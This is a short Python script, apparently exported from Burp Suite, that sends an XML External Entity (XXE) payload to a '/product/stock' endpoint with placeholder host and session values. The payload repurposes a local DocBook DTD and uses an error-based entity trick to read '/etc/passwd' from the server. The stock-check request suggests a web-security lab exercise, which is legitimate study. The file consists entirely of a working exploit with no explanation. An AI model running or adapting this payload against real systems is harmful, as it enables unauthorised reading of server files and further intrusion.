import requests

burp0_url = "https://YOUR_HOST/product/stock"
burp0_cookies = {"session": "YOUR_SESSION_HERE"}
burp0_headers = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0",
    "Accept": "*/*",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Content-Type": "application/xml",
    "Sec-Fetch-Dest": "empty",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Site": "same-origin",
    "Priority": "u=0",
    "Te": "trailers"
}
burp0_data = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\r\n<!DOCTYPE message [\r\n<!ENTITY % local_dtd SYSTEM \"file:///usr/share/yelp/dtd/docbookx.dtd\">\r\n<!ENTITY % ISOamso '\r\n<!ENTITY &#x25; file SYSTEM \"file:///etc/passwd\">\r\n<!ENTITY &#x25; eval \"<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>\">\r\n&#x25;eval;\r\n&#x25;error;\r\n'>\r\n%local_dtd;\r\n]>\r\n<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>"
requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)